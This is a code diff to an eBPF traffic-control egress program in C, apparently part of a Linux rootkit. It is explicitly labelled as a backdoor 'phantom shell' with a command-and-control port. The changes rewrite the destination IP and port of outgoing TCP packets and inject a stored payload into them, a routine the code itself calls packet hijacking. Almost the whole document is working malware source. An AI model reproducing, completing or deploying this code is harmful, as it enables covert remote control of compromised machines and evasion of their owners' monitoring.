@@ -24,7 +24,7 @@ SEC("classifier/egress")
 int classifier_egress(struct __sk_buff *skb){
 	void *data = (void *)(__u64)skb->data;
 	void *data_end = (void *)(__u64)skb->data_end;
-    bpf_printk("TC egress classifier called\n");
+    //bpf_printk("TC egress classifier called\n");
 	
 	//We are interested on parsing TCP/IP packets so let's assume we have one
 	//Ethernet header
@@ -57,12 +57,13 @@ int classifier_egress(struct __sk_buff *skb){
         return TC_ACT_OK;
     }
 
-	//We now proceed to scan for our backdoor packets
-	/*__u16 dest_port = ntohs(tcp->dest);
-	if(dest_port != SECRET_PACKET_DEST_PORT){
+	//We must avoid tampering with packets directed to 9000, this is just
+	//for testing in lo, since it makes us modify the trigger
+	__u16 src_port = ntohs(tcp->source);
+	if(src_port == CC_CLIENT_SECRET_COMMANDING_PORT_DEFAULT){
 		bpf_printk("PORT CHECK\n");
 		return TC_ACT_OK;
-	}*/
+	}
 
 	bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
 	bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip, tcp);
@@ -89,13 +90,12 @@ int classifier_egress(struct __sk_buff *skb){
 	if(ps_data == (void*)0){
 		//Phantom shell not active
 		bpf_printk("Phantom shell NOT active yet\n");
-		int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
+		/*int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data, BPF_ANY);
 		if(err<0){
 			bpf_printk("Fail to update map\n");
-		}
+		}*/
 		return TC_ACT_OK;
-	}
-	if(ps_data->active == 0){
+	}else if(ps_data->active == 0){
 		bpf_printk("Phantom shell NOT active right now\n");
 		return TC_ACT_OK;
 	}
@@ -109,42 +109,49 @@ int classifier_egress(struct __sk_buff *skb){
 	if(err<0){
 		bpf_printk("Fail to update map\n");
 	}
-	bpf_printk("Phantom shell active now, A:%i IP:%i P:%i\n", ps_data->active, ps_data->d_ip, ps_data->d_port);
+	bpf_printk("Phantom shell active now, A:%i IP:%x P:%x\n", ps_data->active, ps_data->d_ip, ps_data->d_port);
+	bpf_printk("Phantom shell param payload: %s\n", ps_data->payload);
 	__u32 new_ip = ps_data->d_ip;
 	__u16 new_port = ps_data->d_port;
-	__u32 offset_ip = offsetof(struct iphdr, saddr)+ sizeof(struct ethhdr);
-	__u16 offset_port = offsetof(struct tcphdr, source)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
+	__u32 offset_ip = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
+	__u32 offset_port = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) + sizeof(struct iphdr);
+	//bpf_printk("Payload: %s\n", payload);
+	//TODO, adjust the length to the new payload. Verifier complains a lot so we will keep it like this for now
+	__u32 increment_len = sizeof(char)*64;
+	
 	bpf_printk("offset ip: %u\n", offset_ip);
-	int ret = bpf_skb_store_bytes(skb, offset_ip, &new_ip, sizeof(__u32), BPF_F_RECOMPUTE_CSUM);
+	int ret = bpf_skb_store_bytes(skb, offset_ip, &new_ip, sizeof(__u32), 0);
 	if (ret < 0) {
 		bpf_printk("Failed to overwrite destination ip: %d\n", ret);
 		return TC_ACT_OK;
 	}
+	
 	bpf_printk("offset port: %u\n", offset_port);
-	ret = bpf_skb_store_bytes(skb, offset_port, &new_port, sizeof(__u16), BPF_F_RECOMPUTE_CSUM);
+	ret = bpf_skb_store_bytes(skb, offset_port, &new_port, sizeof(__u16), 0);
 	if (ret < 0) {
 		bpf_printk("Failed to overwrite destination port: %d\n", ret);
 		return TC_ACT_OK;
 	}
 
-	//We want to substitute the payload too.
-	bpf_printk("Payload: %s\n", payload);
-	if(payload_size>=64){
-		return TC_ACT_OK;
-	}
-	ret = bpf_skb_change_tail(skb, 64-payload_size, 0);
+	ret = bpf_skb_change_tail(skb, skb->len+increment_len, 0);
 	if (ret < 0) {
 		bpf_printk("Failed to enlarge the packet (via tail): %d\n", ret);
 		return TC_ACT_OK;
 	}
+	ret = bpf_skb_pull_data(skb, 0);
+	if(ret<0){
+		bpf_printk("Failed to pull data\n");
+	}
 
 	//After changing the packet bounds, all the boundaries must be check again
+	data = (void *)(__u64)skb->data;
+	data_end = (void *)(__u64)skb->data_end;
+	
 	eth = data;
 	if ((void *)eth + sizeof(struct ethhdr) > data_end){
         bpf_printk("ETH\n");
 		return TC_ACT_OK;
     }
-	
 	ip = (struct iphdr*)(data + sizeof(struct ethhdr));
 	if ((void *)ip + sizeof(struct iphdr) > data_end){
 		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
@@ -155,17 +162,49 @@ int classifier_egress(struct __sk_buff *skb){
 		bpf_printk("TCP CHECK\n");
         return TC_ACT_OK;
 	}
+	if(eth == (void*)0 || tcp == (void*)0 || ip == (void*)0){
+		return TC_ACT_OK;
+	}
 	payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
 	payload = data_end - payload_size;
-	if(payload<(char*)data || payload_size>=sizeof(char)*64){
+	if(payload_size>=sizeof(char)*64){
+		return TC_ACT_OK;
+	}
+	if(data>data_end){
+		return TC_ACT_OK;
+	}
+	
+	__u32 offset = skb->len-payload_size-increment_len;
+	if(ps_data==(void*)0){
+		return TC_ACT_OK;
+	}
+	if(increment_len>skb->data_end-skb->data){
+		return TC_ACT_OK;
+	}
+	if(skb->data_end < skb->data + increment_len){
 		return TC_ACT_OK;
 	}
 
-	ret = bpf_skb_store_bytes(skb, payload-(char*)data, ps_data->payload, (sizeof(char)*64)-payload_size, BPF_F_RECOMPUTE_CSUM);
-	if (ret < 0) {
-		bpf_printk("Failed to overwrite destination port: %d\n", ret);
+	//Simple strlen
+	__u32 payload_char_len = 0;
+	for(int ii=0; ii<64; ii++){
+		if(ps_data->payload[ii]!='\0'){
+			payload_char_len++;
+		}else{
+			break;
+		}
+	}
+	if(payload_char_len>=increment_len|| payload_char_len<=0){
 		return TC_ACT_OK;
 	}
+
+	bpf_printk("New payload offset %i, writing %i bytes\n", offset, payload_char_len);
+	ret = bpf_skb_store_bytes(skb, offset, ps_data->payload, payload_char_len, 0);
+	if (ret < 0) {
+		bpf_printk("Failed to overwrite payload: %d\n", ret);
+		return TC_ACT_OK;
+	}
+	bpf_printk("Finished packet hijacking routine\n");
 
 	return TC_ACT_OK;
 	
